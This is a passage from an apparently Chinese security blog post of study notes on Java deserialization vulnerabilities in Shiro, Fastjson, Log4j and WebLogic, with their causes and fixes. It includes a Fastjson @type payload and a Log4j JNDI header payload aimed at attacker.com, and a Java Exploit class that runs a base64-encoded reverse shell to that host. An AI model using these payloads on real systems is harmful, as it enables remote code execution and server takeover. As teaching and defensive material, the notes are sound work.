e"></i><span> 时间轴</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">反序列化实战</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-21T00:17:09.000Z" title="发表于 2025-04-21 08:17:09">2025-04-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-23T04:21:26.595Z" title="更新于 2025-04-23 12:21:26">2025-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h1><h2 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h2><p>漏洞原理：用户登录时会生成一个加密的cookie（remeberMe），下次访问自动认证。序列化用户信息-&gt;使用AES-128-CBC加密-&gt;base64写入cookie，shiro使用密钥前16位作为iv。</p>
<p>把恶意的序列化后的数据使用该密匙进行AES加密之后base64编码。传给cookie。服务器就回去反序列化我们恶意数据，可以达到命令执行的效果</p>
<h2 id="shiro721"><a href="#shiro721" class="headerlink" title="shiro721"></a>shiro721</h2><p>漏洞前提：有个合法的用户cookie</p>
<p>漏洞原理：使用了动态密钥。截获合法cookie后。解码分离出来IV和密文块，串改IV和对应的密文块后利用服务器对填充错误的差异响应来暴获得原始明文密钥。迭代破解。从最后一位开始枚举</p>
<p>修复方案：</p>
<p>升级shiro、禁用RemenberMe、更换加密模式（AES-GCM）</p>
<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><p>漏洞原理：Fastjson在序列化时，可通过<code>@type</code>字段指定目标类。若开启AutoType功能，Fastjson会根据该字段动态创建对应的java对象，攻击者可以构造恶意json数据，诱导Fastjson反序列化危险的类，触发代码执行</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://attacker.com/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>结合jndi注入实现RCE。rmi，TemplatesImpl</p>
<p>修复方案：</p>
<p>升级Fastjson、禁用或限制AutoType、避免反序列化不可信数据，使用safeMode、禁用jndi远程加载</p>
<h1 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h1><p>漏洞原理：java日志框架，log4j支持在日志输出中通过lookup功能动态解析变量${env:user}.攻击者可能构造包含JNDI协议的恶意字符串，诱使log4j发起远程请求并加载攻击者控制的代码。</p>
<ol>
<li>注入恶意日志：在表单或日志请求中发送<code>$&#123;jndi:ldap://attacker.com/Exploit&#125;</code>的输入</li>
<li>log4j解析JNDI：向<code>attacker.com</code>的LDAP服务器发起请求。</li>
<li>加载远程恶意类：LDAP服务器返回指向恶意java类的地址</li>
<li>执行恶意代码：目标服务器下载并执行该类的构造函数或静态代码块，导致RCE</li>
</ol>
<p>漏洞利用：</p>
<p>构造恶意payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>victim.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>$&#123;jndi:ldap://attacker.com/Exploit&#125;</span><br></pre></td></tr></table></figure>

<p>搭建恶意服务器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目标服务器解析日志时加载 <code>Exploit.class</code>，执行反向 Shell 命令，攻击者获得服务器控制权。</p>
<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>漏洞原理：T3协议工作在7001端口。攻击者构造恶意序列化对象，通过 T3 协议发送至 WebLogic 服务器。服务器在反序列化时，触发依赖链，最终执行任意代码</p>
<ol>
<li>使用 <code>ysoserial</code> 生成 <code>JRMPClient</code> Payload。</li>
<li>WebLogic 反序列化后，向攻击者控制的 JRMP 服务器发起连接。</li>
<li>JRMP 服务器返回二次 Payload（如 <code>CommonsCollections</code> 链），触发 RCE。</li>
